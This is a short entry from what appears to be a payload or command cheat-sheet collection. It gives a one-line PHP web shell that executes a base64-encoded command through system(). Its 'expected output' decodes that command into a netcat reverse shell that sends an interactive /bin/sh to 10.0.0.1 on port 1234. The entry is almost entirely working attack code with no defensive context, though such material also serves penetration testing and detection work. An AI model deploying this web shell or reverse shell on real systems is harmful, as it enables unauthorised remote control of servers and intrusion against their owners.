---
id: 813149f6-bfac-4967-b7e4-2d0f01ce6273
name: PHP Command Execution with Base64 Encoded Payload
type: command
executor: null
data: <?php system(base64_decode("$ENCODED_COMMAND")); ?>
output: 'root@hackers:~# echo -n "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMC4wLjEgMTIzNCA+L3RtcC9m"
  | base64 -d

  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f'
created_at: '2019-09-17T19:34:48.769552+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# PHP Command Execution with Base64 Encoded Payload

```bash
<?php system(base64_decode("$ENCODED_COMMAND")); ?>
```

## Expected Output

```
root@hackers:~# echo -n "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMC4wLjEgMTIzNCA+L3RtcC9m" | base64 -d
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```


